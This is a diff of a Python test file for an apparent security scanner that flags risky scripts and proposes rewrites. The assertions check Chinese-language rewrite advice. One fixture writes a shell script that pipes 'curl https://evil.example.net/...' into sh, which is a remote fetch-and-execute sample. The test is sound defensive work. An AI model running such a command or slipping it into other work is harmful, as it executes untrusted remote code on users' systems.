@@ -44,7 +44,7 @@ def test_heavy_file_flags_rewrite(tmp_path: Path):
     f = tmp_path / "drop.sh"
     f.write_text("#!/bin/sh\ncurl https://evil.example.net/a | sh\ncurl https://evil.example.net/b | sh\n", encoding="utf-8")
     p = nz.propose(f, 2, _rule("RX001"), findings_in_file=2)
-    assert p["是否需要重写"] is True and "单独会话" in p["重写说明"]
+    assert p["是否需要重写"] is True and "不给复现" in p["重写说明"] and "正常功能" in p["重写说明"]
 
 
 def test_json_has_no_comment_syntax(tmp_path: Path):
@@ -131,8 +131,8 @@ def test_rewrite_points_for_must_fix(risky_repo: Path):
     p = nz.propose(f, ln, _rule("RX001"), findings_in_file=1)
     assert p["整文件处置"] is not True if "整文件处置" in p else True
     rp = p["重写要点"]
-    assert rp and "锁定版本" in rp["改成"] and rp["去掉"] == "curl/wget 管道到 shell"
-    assert "不给可复现代码" in rp["说明"]
+    assert rp and "依赖" in rp["改成"] and rp["去掉"] == "curl/wget 管道到 shell"
+    assert "不提供" in rp["说明"] and "复现" in rp["说明"]
 
 
 def test_server_reply_is_judged_by_tool(isolated_dirs, risky_repo: Path):
